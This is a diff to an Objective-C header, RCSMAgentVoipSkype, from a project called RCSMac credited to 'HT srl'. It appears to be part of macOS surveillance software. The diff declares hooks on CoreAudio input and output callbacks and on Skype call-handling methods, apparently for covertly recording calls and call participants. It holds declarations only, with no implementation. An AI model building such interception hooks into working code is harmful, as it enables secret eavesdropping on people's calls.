@@ -1,10 +1,10 @@
-//
-//  RCSMAgentVoip_IM.h
-//  RCSMac
-//
-//  Created by revenge on 10/23/09.
-//  Copyright 2009 __MyCompanyName__. All rights reserved.
-//
+/*
+ *  RCSMAgentVoipSkype.m
+ *  RCSMac
+ *
+ *  Created by revenge on 10/23/09.
+ *  Copyright 2009 HT srl. All rights reserved.
+ */
 
 #import <CoreAudio/CoreAudio.h>
 #import <QTKit/QTKit.h>
@@ -16,8 +16,11 @@
 #import "RCSMCommon.h"
 
 
-void VPSKypeStartAgent();
-void VPSKypeStopAgent();
+void VPSkypeSetupForVersion2();
+void VPSkypeSetupForVersion5();
+
+BOOL VPSkypeStartAgent();
+BOOL VPSkypeStopAgent();
 
 BOOL logCall (u_int, BOOL);
 
@@ -31,6 +34,15 @@ OSStatus
                                  void *);
 
 OSStatus
+_hook_AudioDeviceIOProcInput (AudioDeviceID         inDevice,
+                              const AudioTimeStamp  *inNow,
+                              const AudioBufferList *inInputData,
+                              const AudioTimeStamp  *inInputTime,
+                              AudioBufferList       *outOutputData,
+                              const AudioTimeStamp  *inOutputTime,
+                              void                  *inClientData);
+
+OSStatus
 (*_real_AudioDeviceIOProcOutput) (AudioDeviceID,
                                   const AudioTimeStamp *,
                                   const AudioBufferList *,
@@ -38,6 +50,15 @@ OSStatus
                                   AudioBufferList *,
                                   const AudioTimeStamp *,
                                   void *);
+
+OSStatus
+_hook_AudioDeviceIOProcOutput (AudioDeviceID         inDevice,
+                               const AudioTimeStamp  *inNow,
+                               const AudioBufferList *inInputData,
+                               const AudioTimeStamp  *inInputTime,
+                               AudioBufferList       *outOutputData,
+                               const AudioTimeStamp  *inOutputTime,
+                               void                  *inClientData);
 
 OSStatus
 _hook_AudioDeviceIOProc (AudioDeviceID         inDevice,
@@ -95,6 +116,15 @@ _hook_AudioDeviceCreateIOProcID (AudioDeviceID inDevice,
                                  AudioDeviceIOProcID *outAudioProcID);
 
 OSStatus
+(*_real_AudioDeviceDestroyIOProcID) (AudioDeviceID,
+                                     AudioDeviceIOProc);
+
+OSStatus
+_hook_AudioDeviceDestroyIOProcID (AudioDeviceID       inDevice,
+                                  AudioDeviceIOProcID inIOProcID);
+
+
+OSStatus
 (*_real_AudioDeviceSetProperty) (AudioDeviceID,
                                  const AudioTimeStamp *,
                                  UInt32,
@@ -128,29 +158,32 @@ _hook_AudioDeviceGetProperty (AudioDeviceID           inDevice,
                               UInt32                  *ioPropertyDataSize,
                               void                    *outPropertyData);
 
-// Just to avoid compiler warnings
-/*@interface MacCallX
-
-- (uint)placeCallTo: (id)arg1;
-- (void)answer;
-
-- (id)activeCallMembers;
-- (id)activeCallMemberIdentities;
-- (id)callMemberIdentities;
-- (id)callMembers;
-- (id)callName;
-
-- (id)hostIdentity;
-- (id)firstActiveMember;
-
-@end*/
-
 @interface myMacCallX : NSObject
 
 - (uint)placeCallToHook: (id)arg1;
 - (void)answerHook;
+- (BOOL)isFinishedHook;
 - (void)checkActiveMembersName;
 
 @end
+
+@interface myEventController : NSObject
+
+- (void)handleNotificationHook: (id)arg1;
+
+@end
+
+//@interface mySKConversationManager : NSObject
+
+//- (void)setActiveLiveConversationHook: (id)arg1;
+//- (void)handleConversationHook: (id)arg1 liveStatusChanged: (id)arg2;
+
+//@end
+
+//@interface mySKUserInteraction : NSObject
+
+//- (void)ringForMeNotificationHook: (id)arg1;
+
+//@end
 
 #endif
